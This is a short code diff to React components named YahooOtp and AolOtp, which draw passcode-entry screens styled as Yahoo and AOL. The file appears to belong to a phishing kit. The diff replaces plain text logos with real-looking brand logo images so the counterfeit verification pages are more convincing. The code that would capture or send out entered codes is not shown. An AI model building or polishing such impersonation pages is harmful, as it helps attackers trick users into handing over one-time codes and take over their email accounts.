@@ -155,9 +155,11 @@ const YahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boo
     <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
       <div className="w-full max-w-md">
         <div className="text-center mb-6">
-          <svg viewBox="0 0 120 40" className="mx-auto h-10 mb-6">
-            <text x="0" y="32" fill="#720e9e" fontSize="36" fontWeight="700" fontFamily="'Helvetica Neue',Arial">Yahoo</text>
-          </svg>
+          <img 
+            src="https://www.edigitalagency.com.au/logos/new-yahoo-logo-png-purple/" 
+            alt="Yahoo" 
+            className="mx-auto h-10 mb-6" 
+          />
         </div>
 
         <div className="bg-white rounded-lg p-8" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
@@ -268,9 +270,11 @@ const AolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boole
     <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
       <div className="w-full max-w-md">
         <div className="text-center mb-6">
-          <svg viewBox="0 0 80 40" className="mx-auto h-10 mb-6">
-            <text x="0" y="32" fill="#39007E" fontSize="36" fontWeight="700" fontFamily="'Helvetica Neue',Arial">Aol</text>
-          </svg>
+          <img 
+            src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" 
+            alt="Aol" 
+            className="mx-auto h-10 mb-6" 
+          />
         </div>
 
         <div className="bg-white rounded-lg p-8" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
